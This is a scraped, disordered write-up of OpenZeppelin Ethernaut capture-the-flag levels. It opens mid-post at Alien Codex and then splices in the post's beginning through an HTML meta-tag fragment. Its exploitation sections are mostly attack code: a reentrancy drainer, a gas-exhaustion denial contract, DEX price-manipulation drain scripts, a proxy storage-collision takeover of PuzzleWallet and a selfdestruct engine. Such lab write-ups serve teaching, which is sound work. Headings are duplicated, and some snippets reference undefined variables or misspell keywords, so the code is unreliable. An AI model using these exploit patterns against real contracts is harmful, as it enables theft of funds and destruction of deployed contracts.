**Exploitation** that ?

![Alien Codex method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138017/86f1f291d81ff664dbe3c9afd11c315bb31de2e0a3283a0f8d964b43e9bf44eb_tcxxpp.png)  

We got 2 slots taken from the whole storage. If we make the length of the array takes up the whole storage then we can overwrite any value of it. `retract` allows that, the `array.length` is `uint256`. 

After taking up the whole storage we need to find the position of the owner variable.
Our current storage layout is.

```js
/* STORAGE
* [0]: contract + owner , 
* [1]: codex
* keccak256(1) : codex[0]
*       ..
*        ..
* [2^256]: 0x000000000
*/
```

We want to overlap and get to slot[0] to set it. We can calculate the index of that element by `2^256 - keccack(256)(1) +1`

-----
**Exploitation**

first we call the `retract` to set the array length to max.

```js
await contract.retract()
```

then we get our payload, here is a utils contract.

```js
contract Utils { 

    function getNumber() public pure returns (uint256){
      uint256 x =0;
        
        // return x-1 - uint256(keccak256(abi.encodePacked(uint256(1))))+1;
        
        return x - uint256(keccak256(abi.encodePacked(uint256(1))));
    }
}
```

We check if we got it right 😄

![Alien Codex - check](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/03ed7019523687b6195b1e2824212ccf9c27300ff053773c2f5b93ea5b79580d_boj4jy.png)  

no need to be puzzled we know what it is it&#x27;s the contact value + 

![Alien Codex - Level address](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138013/9faab8cbd57b86461622fa7e3aad8dab64aed6c6d4a52a4ee19088857b840d21_pzx1am.png)  

So our payload should be 

```Js
0x00000000000000000000000184e7a3679A82C2766Ff8382862ab883FF9460307
0x000000000000000000000001YOUR_ADDRESS_HERE
```

Challenge solved ✅

## Denial

&gt; There is a way to using `addr.call{value:x}(&quot;&quot;)`, only that it forwards all remaining gas and opens up the ability to perform more expensive actions ( and it returns a failure code instead of propagating the error )  ~ Solidity docs

That&#x27;s all we need. So I lost quite bit of time looking for a way to reach the call stack depth limit ( which is 1024 ). But it was more the hard way of doing things.  What if we didn&#x27;t leave the caller contract enough gas to transfer the 1% of the owner ? Yes that&#x27;s really it !

-----
**-----
**Exploitation**ation**

Our evil contract, btw don&#x27;t try to run it on Remix as it will crash instead use truffle console or something similar to try it 

```js
contract EvilContract { 
    receive() external payable {
        while(true);  // the line that crashed my whole VM
    }
}
```

Challenge solved ✅
 
 &gt; This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.
If you are using a low level call to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example call.gas(100000).value().

Typically one should follow the checks-effects-interactions pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

Note: An external CALL can use at most 63/64 of the gas currently available at the time of the CALL. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.


## Shop

```js
interface Shop {

  function buy()  external ;
  function isSold()  external view returns (bool) ;
  }

contract EvilContract { 
    address victimAddress;
    Shop shopContract;

    function setVictimAddress( address _victimAddress) public { 
        victimAddress= _victimAddress;
        shopContract = Shop(_victimAddress);
    }

    function price() external view returns (uint){
        return shopContract.isSold()?0:100;
    }

    function buy() public {
        shopContract.buy();
    }
}
```

## Dex

`This challenge and it&#x27;s second version will have the same solution basically with a little tweak. Better understand the concept`

**Challenge description**

&gt;The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.
You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.
You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a &quot;bad&quot; price of the assets.

--------
**Analysis**

The logic is faultless or is it ?  Well to be honest had to try many things here. One thing that got my attention that the equation made to calculate the swap_amount was familiar but not that much

![Dex Equation](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138013/17dcc969cfc52464829cb1a88231824931fda3a5b0d0b1d3d446eaf763974942_xxpfji.png)

A good read to understand it [Amazing Article to understand AMM](https://www.gemini.com/cryptopedia/amm-what-are-automated-market-makers).

So actually by balancing our token balance from one token to another we will manage at last to drain the contract&#x27;s balance of one token&#x27;s type.

-----
**-----
**Exploitation**ation**

```js
const contractABI = artifacts.require(&quot;Dex&quot;);

// if token1.balance &gt; token2.balance ==&gt; token2 is more expensive because it has less tokens
// we want to trade the most expensive tokens
// knowTokenValues() ==&gt; Distiniguishing the most expensive and cheapest token
// getSwapValues() // Basically our balance in the most expensive token
// ==============================

let contract ;
const TOKEN1_ADDRESS = &quot;0x954aB18d300D8FFE76a2eFE7B36fcD6EF36825c7&quot;;
const TOKEN2_ADDRESS = &quot;0xE651aD37ac31B03F7B49036248A29DC75D0093E6&quot;;
let PLAYER=&#x27;PLAYER_ADDRESS&#x27;

async function getBalances(){
    const token1Balance = (await contract.balanceOf(TOKEN1_ADDRESS,contract.address)).toNumber();
    const token2Balance = (await contract.balanceOf(TOKEN2_ADDRESS,contract.address)).toNumber();
    console.log(`Current Balances for contract : A : ${token1Balance} \t B : ${token2Balance}`);
    return {token1Balance,token2Balance}
}

 function knowTokenValues({token1Balance,token2Balance}){
    return {mostExpensiveToken: token1Balance &gt;= token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS,cheapestToken:token1Balance &lt; token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS };
}

async function getSwapValues(tokensWithValues){
    let toSwap  = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,PLAYER)).toNumber();
    let available = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,contract.address)).toNumber();

    // to be able to drain the funds and not stop when we got too much tokens.
    if(toSwap&gt;available)toSwap=available;

    return toSwap;
}


async function drainFunds(){
    
    let flag=true; // check condition

    // approving otherwise you will get an error due to how ERC20 works.
    await contract.approve(contract.address,10000,{from:PLAYER});

    while(flag){
        const balances = await getBalances();
        const tokenValues =  knowTokenValues(balances);
        const toSwap = await getSwapValues(tokenValues);
        await contract.swap(tokenValues.mostExpensiveToken,tokenValues.cheapestToken,toSwap,{from:PLAYER});
        console.log(`swapped ${toSwap} ${tokenValues.mostExpensiveToken} for  ${tokenValues.cheapestToken}`);

        flag = token1Balance*token2Balance&gt;0;
    }
    
    console.log(&quot;Hacked !&quot;)
}


module.exports = async  function(deployer) {
  
  contract = await contractABI.at(&quot;0xBa71E2eEF0D68C5aBCDe6dF3EEf9377b9eD9E78C&quot;); 
  await drainFunds();
};
```

![Dex console](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138023/852281f645c829a2d76b966618bbb6c25f1c4721506ecca9de0e7e6ef4fab42f_dw1jen.png)  

## Dex 2

## Challenge Description

Same as Dex v1 but now we need to drain both tokens.

--------
**Analysis**

Same here but we got one less check that makes it possible to inject a third token and thus draining both contract&#x27;s main tokens&#x27; balance.

![Dex 2 Function](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/aeb9bb0ecc92f4b707acbc9170c3bd3355c4361d3523704a799bc8717093366d_ogt3sr.png)  

-----
**-----
**Exploitation**ation**

```js
const contractABI = artifacts.require(&quot;Dex&quot;);

let contract ;
let TOKEN1_ADDRESS = &quot;0x954aB18d300D8FFE76a2eFE7B36fcD6EF36825c7&quot;;
let TOKEN2_ADDRESS = &quot;0xE651aD37ac31B03F7B49036248A29DC75D0093E6&quot;;

const TOKEN3_ADDRESS= &quot;0xfe5A0de02e7c76f2A51e3d297e65ccE784787538&quot;

let PLAYER=&#x27;0x84e7a3679A82C2766Ff8382862ab883FF9460307&#x27;

async function getBalances(){
    const token1Balance = (await contract.balanceOf(TOKEN1_ADDRESS,contract.address)).toNumber();
    const token2Balance = (await contract.balanceOf(TOKEN2_ADDRESS,contract.address)).toNumber();
    console.log(`Current Balances for contract : A : ${token1Balance} \t B : ${token2Balance}`);
    return {token1Balance,token2Balance}
}

async function knowTokenValues({token1Balance,token2Balance}){
    return {mostExpensiveToken: token1Balance &gt;= token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS,cheapestToken:token1Balance &lt; token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS };
}

async function getSwapValues(tokensWithValues){
    let toSwap  = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,PLAYER)).toNumber();
    let available = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,contract.address)).toNumber();

    // making sure at the end when we get most of balance in one token type we can still get the rest of the tokens.
    if(toSwap&gt;available)toSwap=available;

    return toSwap;
}


async function drainFunds(){
    
    let flag=true;
    await contract.approve(contract.address,10000,{from:PLAYER});
    while(flag){
        const balances= await getBalances();
        const tokenValues= await knowTokenValues(balances);
        const toSwap = await getSwapValues(tokenValues);
        await contract.swap(tokenValues.mostExpensiveToken,tokenValues.cheapestToken,toSwap,{from:PLAYER});
        console.log(`swapped ${toSwap} ${tokenValues.mostExpensiveToken} for  ${tokenValues.cheapestToken}`);
flag = balances.token1Balance*balances.token2Balance&gt;0;
    }
    // Token2 balance  = 0. Make sure to set the token3 value to the same value as token1 at the end of this loop.

    flag = true;
     TOKEN2_ADDRESS=TOKEN1_ADDRESS;
     TOKEN1_ADDRESS=TOKEN3_ADDRESS;

while(flag){
        const balances= await getBalances();
        const tokenValues= await knowTokenValues(balances);
        const toSwap = await getSwapValues(tokenValues);
        await contract.swap(tokenValues.mostExpensiveToken,tokenValues.cheapestToken,toSwap,{from:PLAYER});
        console.log(`swapped ${toSwap} ${tokenValues.mostExpensiveToken} for  ${tokenValues.cheapestToken}`);

        flag = balances.token1Balance*balances.token2Balance&gt;0;
    }
    
    console.log(&quot;Hacked !&quot;)
}


module.exports = async  function() {
  
  contract = await contractABI.at(&quot;0x5b9777555BDC7bA0Dee12EBB6d0Fc1E6Dc83b20a&quot;); 
  await drainFunds();
}
```

#### Solidity Contract for test and for the token3

Make sure to add a reasonable balance to the instance.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol&quot;;
import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol&quot;;

contract SwappableToken is ERC20 {

  constructor( string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    super._approve(owner, spender, amount);
  }
}

// transfer(instanceAddress,ValueYouWant)
```

## PuzzleWallet

**Challenge description**

&gt; The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.
&gt; Little did they know, their lunch money was at risk…
  You&#x27;ll need to hijack this wallet to become the admin of the proxy.
  Things that might help::
    Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one.
    Knowing about proxy patterns and the way they handle storage variables.

--------
**Analysis**

We all know that smart contracts code is immutable. Once the smart contract is deployed it cannot be changed that&#x27;s why companies are spending thousands of dollars to make sure that the smart contract is faultless before deployment. Proxies are on the other hand a way to make smart contracts seem upgradable. By adding a new layer in the form of contract we can now which version accepts incoming calls. The code is long and It took me quite a while to get a grasp of it. So I will be highlighting the most interesting parts

```js
contract PuzzleProxy is UpgradeableProxy {
    // Getting to know the storage&#x27;s layout of our contract
    address public pendingAdmin;
    address public admin;
    ...

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    ...

    contract PuzzleWallet {
        // PuzzleWallet storage&#x27;s layout
    using SafeMath for uint256;
    address public owner;
    ...

        modifier onlyWhitelisted {
           require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);
            _;
        }

      // Can change the storage slot[1]
      function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      // contract&#x27;s balance should be 0, but wait how much is it now ? 
      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);
      ...

      // only owner can add to white list
      function addToWhitelist(address addr) external {
        require(msg.sender == owner, &quot;Not the owner&quot;);
        ...

        // You should be in whitelisted to be here
        function multicall(bytes[] calldata data) external payable onlyWhitelisted {
            ...
            assembly {
                // for more low level ops
                selector := mload(add(_data, 32))
            }
            ...
            // deposit can only be called once 
            if (selector == this.deposit.selector) {
                require(!depositCalled, &quot;Deposit can only be called once&quot;);
                // Protect against reusing msg.value
                depositCalled = true;
            }
            ...
            // To not mistake it for the normal contract to contract delegate let&#x27;s call it selfDelegate.
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, &quot;Error while delegating call&quot;);
        }
    }
}


```

Following the inheritance tree I found finally how the proxy call the real implementation. It was hinted in the challenge description too.

```js
  let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
```

Okay let&#x27;s sum it up in a diagram.

![PuzzleWallet diagram](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138015/9b067dbdb383316b6e46909a1bc3a9d8df1c699f4c6091286b753b9fd2e54fcc_e13u24.png)  

delegateCall can create big messes if we are not careful to the storage layout like we have seen in previous challenges. Let&#x27;s inspect the storage layout for both contracts.

![PuzzleWallet storage](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138027/f6f56436b637fed9a8b0a7f1353a0da755a55af222edb26ed38c71fb3d76435e_t0ouln.png)  

`owner` and `pendingAdmin` both are at the slot[0] which is a very big problem. We can manipulate the pendingAdmin so when we `puzzleWalletAddress.delegateCall` we became the owner of the puzzleWallet contract ! huuuge.

We will be using the `proposeNewAdmin` to set the `pendingAdmin` value.

Okay so now we can execute `owner` functions. Let&#x27;s not forget our goal is to become the `owner` of the *Proxy* contract. Let&#x27;s look for the function that can set `slot[1]` of the storage in both contracts.

```js
 function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      // contract&#x27;s balance should be 0, but wait how much is it now ? 
      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);
      ...
 }
```

So first of all we need to be `whitelisted`. We can do that

```js
await contract.addToWhitelist(player);
```

Second we need to make the contract balance to 0. `await web3.eth.getBalance(instance)` will return **0.001** ethers as balance. The `execute` function won&#x27;t allow such a thing as we can only withdraw what we did deposit (It&#x27;s tracked in storage variable `balances`). The only way to drain funds is to have more `balance` than the amount we deposited.

If we can&#x27;t call deposit multiple times in one `multicall` how about we do it but by adding another layer of `multicall`

![PuzzleWallet call hiearchy](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/bc95441a9b162a8b1494771895c5a3385ec0e2be3c4d26376c351eae4a5f5d1d_ggsn87.png)  

This allows to have the double of the msg.value as balance. Okay so we said we had **0.001** ethers as contract balance ? let&#x27;s deposit 0.001 to our account so we can drain it. ( we will have the same value for our balance and the contract&#x27;s ) . By having the contract&#x27;s balance as 0 we can simply set the owner ow I mean maxBalance to our player account to **hijack the proxy**.

-----
**Exploitation**

1. become the owner of the contract
2. become whitelisted
3. deposit the balance of the contract with multiple calls
4. withdraw all funds
5. setMaxBalance as our address

&gt; The proxy is completely transparent this is possible by loading the ABI of the PuzzleWallet and using the address of the proxy. Don&#x27;t get confused the address is the proxy&#x27;s !

```js
const proposeAdminCall= web3.eth.abi.encodeFunctionCall({
name: &#x27;proposeNewAdmin&#x27;,
    type: &#x27;function&#x27;,
    inputs: [
        {
            type: &#x27;address&#x27;,
            name: &#x27;_newAdmin&#x27;
        }
    ]
},player)

await web3.eth.sendTransaction({data:proposeAdminCall,from:player,to:instance});

await contract.addToWhitelist(player);

// getting the deposit call data

const depositData = (await contract.methods(&#x27;deposit()&#x27;).request()).data

const multiCallData = (await contract.methods(&#x27;multicall(bytes[])&#x27;).request([depositData])).data

await contract.multicall([multicallData,multicallData],{value:toWei(&#x27;0.001&#x27;)}); // adding to our balance

await contract.execute(player,toWei(&#x27;0.002&#x27;),&#x27;0x0&#x27;); // Draining funds

await contract.setMaxBalance(player) // It will convert upon call 
```

Challenge solved ✅

## Motorbike

**Challenge description**

&gt; Ethernaut&#x27;s motorbike has a brand new upgradeable engine design. 
&gt;  Would you be able to selfdestruct its engine and make the motorbike unusable ?
&gt;Things that might help:
    EIP-1967
    UUPS upgradeable pattern
    Initializable contract

**Analysis**

To solve this challenge, we need to be familiar with both [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) and most importantly  the [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)

After going through all the reading material, as usual I drew the diagram to understand the core logic of the contracts.

![Motorbike Diagram](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138012/3ac10a42b6cb747f06aad171856c6d4814105583603857fbc5fd1e2549969c23_usrhte.png)  

After drawing the diagram, I had many unanswered questions the most important one did we `initialize` the engine contract or not !
I really know where the address of the *Engine* contract is in storage so I can check that !

```js
const engineAddress = await web3.eth.getStorageAt(instance,&#x27;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&#x27;);

// let&#x27;s check the value
await web3.eth.call({to:engineAddress,from:player,data:web3.eth.abi.encodeFunctionSignature(&#x27;upgrader()&#x27;)})
// returned 0x000000
// the initialize() wasn&#x27;t called and that&#x27;s our -----
**Exploitation** !
```


**Exploitation**

1. initialize the *Engine* contract so we become the **upgrader**.
2. upgrade our *Engine* contract to our bomb contract ( which will selfdestruct )
3. call selfdestruct, the call will be done through *delegateCall* so the actual *Engine* will be destructed !

our evil contract

```js
contract BombEngine { 
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function destruct() public {
        selfdestruct( payable ( 0x84e7a3679A82C2766Ff8382862ab883FF9460307));
    }
}
```

```js
const destructData= web3.eth.abi.encodeFunctionSignature(&#x27;destruct()&#x27;);

const data= web3.eth.abi.encodeFunctionCall({
    name: &#x27;upgradeToAndCall&#x27;,
    type: &#x27;function&#x27;,
    inputs: [{
        type: &#x27;address&#x27;,
        name: &#x27;newImplementation&#x27;
    },{
        type: &#x27;bytes&#x27;,
        name: &#x27;data&#x27;
    }]
}, [bombEngineAddress,destructData]);

await web3.eth.sendTransaction({to:engineAddress,from:player,data:data})

// You can do a random call to the Engine contract it will revert because it&#x27;s gone !
```

Challenge solved ✅

"/><meta property="og:title" content="Openzeppelin Ethernaut - Full Writeup"/><meta property="og:description" content="thernaut Full Writeup](#ethernaut-full-writeup)
  - [Hello Ethernaut](#hello-ethernaut)
  - [Fallback](#fallback)
  - [Fallout](#fallout)
  - [CoinFlip](#coinflip)
  - [Telephone](#telephone)
  - [Token](#token)
  - [Delegation](#delegation)
  - [Force](#force)
  - [Vault](#vault)
  - [King](#king)
  - [Re-entrancy](#re-entrancy)
  - [Elevator](#elevator)
  - [Privacy](#privacy)
  - [Gatekeeper One](#gatekeeper-one)
      - [gateOne](#gateone)
      - [gateThree](#gatethree)
      - [gateTwo](#gatetwo)
  - [GateKeeper Two](#gatekeeper-two)
      - [GateOne](#gateone-1)
      - [GateTwo](#gatetwo-1)
    - [gateThree](#gatethree-1)
  - [Naught Coin](#naught-coin)
  - [Perservation](#perservation)
  - [Recovery](#recovery)
  - [Magic Number](#magic-number)
  - [Alien Codex](#alien-codex)
  - [Denial](#denial)
  - [Shop](#shop)
  - [Dex](#dex)
  - [Dex 2](#dex-2)
  - [Challenge Description](#challenge-description)
      - [Solidity Contract for test and for the token3](#solidity-contract-for-test-and-for-the-token3)
  - [PuzzleWallet](#puzzlewallet)
  - [Motorbike](#motorbike)

## Hello Ethernaut

&gt; This challenge is a warm-up challenge and for those who doesn&#x27;t know how to interact with contracts using the js libraries.

```js
await contract.info()
await contract.info1()
await contract.info2(&quot;hello&quot;)

await contract.infoNum()
await contract.info42()

await contract.theMethodName()
await contract.method7123949()

// Here we are asked to submit the password that we know to authenticate but we didn&#x27;t interact with any passwords. A quick guess, password is a public field in the contract 

const password = await contract.password() // We fetch the values of variables as methods

await contract.authenticate(password);
```

Challenge solved ✅

## Fallback

**Challenge description**

&gt; You will beat this level if
    - you claim ownership of the contract
    - you reduce its balance to 0

--------
**Analysis**

a quick run through the code of the challenge, I extracted the valuable methods and variables we will be using.

![Contribute Method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138025/c323ec3e81e2a66f654995386118d6903a9758b1fa877d780d521e99db208afb_eejfmr.png)  

Here we see how the contribute method works. Pretty simple we send ether and it&#x27;s recorded for us.

![fallback method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/90f03025307c6a50bdc53647caac2e2e1e9711fb1fafb173d6765a8668e4bedf_hox5ei.png)  

Okay the **receive** part. As we see here we are defining a function but without the *function* keyword. That&#x27;s because the receive function is a *fallback* function, let&#x27;s say some kind of function that should be existing in all smart contracts but here we are overriding its behaviour.
Actually, since the version 0.6.0 we got two functions to handle fallback cases. *fallback* and *receive*. a little explainer of how they are called ...

```js
// Explainer from: https://solidity-by-example.org/fallback/
    // Ether is sent to contract
    //      is msg.data empty?
    //          /   \ 
    //         yes  no
    //         /     \
    //    receive()?  fallback() 
    //     /   \ 
    //   yes   no
    //  /        \
    //receive()  fallback()
```

So what we need to do here actually ?

1. Contribute so we have a contribution **value non nul**.
2. Trigger the fallback function by sending ether to the contract.

-----
**Exploitation**

```js
await contract.contribute({value:toWei(etherValue)});
await contract.sendTransaction({value:toWei(etherValue)});
```

Challenge solved ✅

## Fallout

Constructors in solidity are quite a story and they were the source of a big -----
**Exploitation**.
Here the challenge is quite simple. All we have is to notice the typo in the constructor function name which makes it a normal **public** function that we can call to get the contract ownership.

```js
await contract.Fal1out();
```

## CoinFlip

`Randomness is just a myth.`

**Challenge description**

You&#x27;ll need to use your psychic abilities to guess the correct outcome 10 times in a row.

--------
**Analysis** 

In blockchain randomness is just quite the issue, not only in the blockchain really that implies for all computers systems and is due to the way we are trying to make deterministic systems have an deterministic results. The matter for the blockchain is its transparency making even finding a seed a quite impossible.

Here we see the function of coinFlip
![CoinFlip method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/a4a71eed827fde83d6d4140e52f376aa5b2cbea20f1587a156118f7e65fa480b_czfni3.png)  

our seed is actually `block.number` but we can know this value easily from the blockchain. So all we have is create a contract that feeds the flip function the values she expect 😈

-----
**Exploitation** 

![CoinFlip Attack](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/1c39007c6e59a8ac5b4a23a23c83efc645c1ed4665dcc7686fe83f28d39bb34a_saizwt.png)  

Now all we have to do is call the contract method 10 times.

## Telephone

**Challenge description**

- Claim ownership of the contract.

--------
**Analysis**

![Telephone method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138025/d794be949c9e5c756d0940618ff646c8dd477ab3f134d3973baac079ec09be4f_xqkdnr.png)  

Here we see the condition being checked is as simple as `tx.origin != msg.sender` but what does `tx.origin` means ?
Actually `tx` is a global variable in the smart contract ( same as js global variables ) and it means the transaction that have been initiated on the function call.
When we call a method from web3 actually we are interacting directly with the smart contract so it will initiate the transaction but when we call a contract from another contract the `tx.origin == caller.address` 

-----
**Exploitation**

Based on our analysis we understand all we need is to call the function from an evil contract and pass our address as parameter.

```js
interface TelephoneInterface{ 
    function changeOwner(address _owner) external; 
}

contract EvilContract { 
    
    TelephoneInterface victimContract;
    contructor(address victimAddress) public {
        victimContract = TelephoneInterface(victimAddress);
    }

    function becomeOwner(address newOwner){
        victimContract.changeOwner(newOwner);
    }
}
```

Challenge solved ✅

## Token

--------
**Analysis**

This challenge is about **unsigned integers**. We need to be extra duper careful when handling them as they *overlap*. What does that mean ? 

```c#
uint8 X= 255;
X=X+1 // X = 0 ;
```
Now you see it.

![Token method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138020/61490e01f7f4c0dcaaa9366ce4607e17714ff36452e562e06c8bcd0d048c335a_df2hde.png)  

```js
 require(balances[msg.sender] - _value &gt;= 0); // How about we pass a big value to this poor unsigned balances[msg.sender] ?
```

-----
**Exploitation**

We got 20 tokens, So I will be generous and give more than I own.

```js
 await contract.transfer(player,21);
```

Challenge solved ✅

## Delegation

**Challenge description**

The goal of this level is for you to claim ownership of the instance you are given.

--------
**Analysis** 

Here we are exposed to the `delegateCall` function. If you don&#x27;t know what this function does I will try to sum it up. It&#x27;s a low level way to call a method of a contract ( in our case `pwn` ) in the context of another, it means it gets the storage values and global ones of the contract who called `delegateCall`.

![Delegation pwn](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138021/2549219ff5c11b36a370c12f1dfd8326925489a9207074b29dfd7f83621353bc_m6k8pd.png)  

![Delegation fallback](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138019/7358cfd1b967281caa40f09ba74e6e9be2e11dce5bb005022749902ece0d530a_vpu7ji.png)  

Okay so what is *msg.data* ?
msg.data can be the function selector with the parameters in a bytes encoded format

-----
**Exploitation**

I wrote a contract to get the bytes, we can also use `web3.eth.abi.encodeFunctionCall` from the console.

```js
contract Utility {
     function pwnEncoded () public pure returns (bytes memory) {
      return abi.encodeWithSignature(&quot;pwn()&quot;); 
    }
```

```js
await contract.sendTransaction({data:valueFromContract});
```
Challenge solved ✅

## Force

We will learn another capability of smart contracts which sometimes became problematic if we rely on it.

**Challenge description**

The goal of this level is to make the balance of the contract greater than zero.

--------
**Analysis**

Nothing to see there the contract is pretty empty. But a big security consideration that no contract can prevent incoming ethers from the blockchain. All we can do is not rely the contract balance in our contract logic.

[Link for more informations](https://docs.soliditylang.org/en/develop/security-considerations.html)

So what is the method to send ethers to an empty contract or let&#x27;s say a contract that has logic which tries to prevent incoming ethers. A quick googling and I came to the answer it&#x27;s the method `selfdestruct(address)`

&gt; The only way to remove code from the blockchain is when a contract at that address performs the selfdestruct operation. The remaining Ether stored at that address is sent to a designated target and then the storage and code is removed from the state

[Docs Link](https://docs.soliditylang.org/en/develop/introduction-to-smart-contracts.html?highlight=selfdestruct#deactivate-and-self-destruct)

We got everything we need now let&#x27;s hack !

-----
**Exploitation**

```js
contract EvilContract { 
    // payable public so we can send it some ether to pass.
    function forceSendBySacrifice(address victimAddress) payable public {
        selfdestruct(_address);

    }
}
```

## Vault

`transparency has no limits`

**Challenge description**

Unlock the vault to pass the level!

--------
**Analysis**

![Vault storage](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/e9446fa1dc73bdd6238eccf71218b163311ff773cb9ef02980f39ab6443d8e0a_auuwqt.png)  
![Vault method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138020/109330cb4bbe2a93530a4c5a6bda285a392f0d2878464d1a581cc5b240a4a3ee_somrgz.png)  

The private keyword of solidity is quite tricky. Private variables limit their scopes to the contract so they can&#x27;t be viewed or accessed by other **contracts** logic. However anyone can view the variable values. This challenge is simple and all we have to understand is the storage is a key value store where the keys are from 0 to 2^256.

Here we can see got two storage variables `locked` and `password`. I highly encouraging reading the docs [Storage solidity Docs](https://docs.soliditylang.org/en/develop/internals/layout_in_storage.html?highlight=storage) to understand how these variables are layed out.

bytes32 will take a whole slot so it can share the slot with locked. We will have then :

*slot0*  `locked`
*solt1*  `password`

-----
**Exploitation**

```js
 const password = await web3.eth.getStorageAt(address, 1);
 await contract.unlock()
```

Challenge solved ✅

## King

**Challenge description**

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

--------
**Analysis**

![King method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138016/26bbecde7b1eacd1313c83ad3cd9b8dc4aa55e3dacc9e5acf006ef155bcbc49c_x8mhfi.png)  

Pretty interesting, at first sight you might find this function unbreakable ( as I did ). But then a good look to the transfer method. I was thinking in term of a user who will interact with this contract. How about another contract ?
If we go back to the `fallback` challenge we talked about *fallback* methods. Here when we call `transfer` a callback function of the contract to whom we are transferring funds to will be triggered.

-----
**Exploitation**

1. Make our contract the king.
2. Our contract now revert the transaction and won&#x27;t step down from the throne 😈.

```js
contract EvilContract { 

    function becomeKing(address victimAddress) public payable { 
        victimAddress.call{value:1000000000000000000}(&quot;&quot;);
    }

    function() external payable { // fallback function definition
        revert(&quot;The kingdom is mine now !&quot;);
    }
}
```

Challenge solved ✅

## Re-entrancy

**Challenge description**

The goal of this level is for you to steal all the funds from the contract.

--------
**Analysis**

A quick read about Re-entrancy attack is all we need: [HackerNoon Article](https://hackernoon.com/hack-solidity-reentrancy-attack).

![Reentrancy method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138011/6b9b88336f13d99f52296f5874086643de346fe2aa6dbd66098162a244b11b6c_ztdmmm.png)  

So he is actually our balance after the call that&#x27;s all we need !

-----
**Exploitation** 

```js
interface Reentrance {

    function donate(address _to) external payable;
    function withdraw(uint amount) public;
}

contract EvilContract {
    Reentrance victimContract;
    address victimAddress;
    uint donatedValue;

    constructor(address _victimAddress) public payable {
        // Set our victim contract, fund the contract.
        victimContract = Reentrance(_victimAddress);
        victimAddress= _victimAddress
    }

    function attack(uint _donatedValue) public {
        victimContract.donate.value(address(this),{value:_donatedValue});
        victimContract.withdraw(_donatedValue);
        donatedValue=_donatedValue
    }

    function() public payable {
        // Receiver for funds withdrawn by the attack
            if(victimAddress.balance&gt;= donatedValue )
            victimContract.withdraw(msg.value);
        }
}
```

Now we should just do some arithmetic to clear all the funds and not having to donate again and withdraw. If we have 1 ether as initial balance keep it to multipliers of 10 and so on.

Challenge solved ✅

## Elevator

`with trust, everyone can get to the last floor`

**Challenge description**

This elevator won&#x27;t let you reach the top of your building. Right?

--------
**Analysis**

![Elevator method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138015/32f18465b7eeaabaeced84613e4e573847463c7b34aefd6d467fdd9d9f04d851_rpolcp.png)  
This function uses the method the msg.sender to know if the floor is accessible or not. The problem here is :

1. `Elevator` contract has no control over the logic of the `Building` contract.
2. The `goTo` function is actually `public` which makes it possible to have some state changes inside it.

